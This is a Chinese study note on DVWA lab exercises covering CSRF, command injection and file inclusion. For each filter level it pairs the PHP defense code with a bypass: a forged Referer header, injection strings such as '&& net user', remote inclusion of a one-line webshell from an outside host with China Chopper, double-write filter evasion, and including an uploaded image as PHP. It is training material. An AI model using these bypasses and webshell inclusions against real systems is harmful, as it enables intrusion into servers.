一.CSRF（跨站请求伪造）
CSRF的两个特点：
CSRF（通常）发生在第三方域名。
CSRF攻击者不能获取到Cookie等信息，只是使用。
CSRF防御方法（根据DVWA的密码修改类型的测试网站总结出的防御方法，其他网站的csrf第三部防御方法会不相同）
1.对用户请求头的中的Referer字段进行验证
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
入侵方法通过burpsuite进行抓包，把抓取到的包中自己加一个Referer字段，
然后值只要设置成包含了主机头127.0.0.1就行了
2.token检测法
csrf依赖于浏览器该问链接时自动对应网站的cookie带上，token不放cookie
（一般form表单加个hidden属性的input标签来存放）csrf就没法获取token，
这样我们就可以通过检测发送过来的数据包中是否有正确的token值来决定是否响应请求。
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
获取用户的 token修改密码的话，就得和XSS漏洞一起结合实现了，将存储型xss插入到数据库中会弹出token。
3.加入输入原密码才能修改密码的验证，实现完美防御CSRF攻击。
二.命令注入（Command Injection）
命令注入防御方法（根据DVWA的命令注入测试网站总结出的防御方法）
成功目标是输入192.168.0.1 && net user字符串
1.添加对字符的过滤对”&&”和”;”进行了过滤
输入192.168.0.1 &;& net view和192.168.0.1 & dir能成功注入
2.添加更多字符的过滤对许多敏感符号（”&”、”;”、”||”等）进行了过滤
根据过滤的字符中发现的没有过滤完全的字符编写注入字符串能成功注入
3.针对每个点进行拆分分成四段再组合起来，难以入侵
三.文件包含（File Inclusion）
文件包含防御方法（根据DVWA的文件包含测试网站总结出的防御方法）
先包含一个不存在的文件http://127.0.0.1/vulnerabilities/fi/?page=haha.php服务器发生报错
在云端搭了一个一句话木马，然后包含该文件看看：
http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.10.139/xie.php
能通过中国菜刀进行渗透
1.使用 str_replace函数 对http:// 和 https://进行了过滤，
防止了远程包含漏洞的产生，也过滤了 ../ 和 ..\ 防止了进行目录切换的包含。
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
对于这种防御措施可以使用双写绕过：hthttp://tp://xx->http://xx  会过滤掉http://
2.对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not  found。
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
需要配合文件上传漏洞，先把一句话木马上传到服务器端，然后再文件包含
http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/PhpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/1.jpg
这样服务器会把jpg文件当成php执行
3.使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;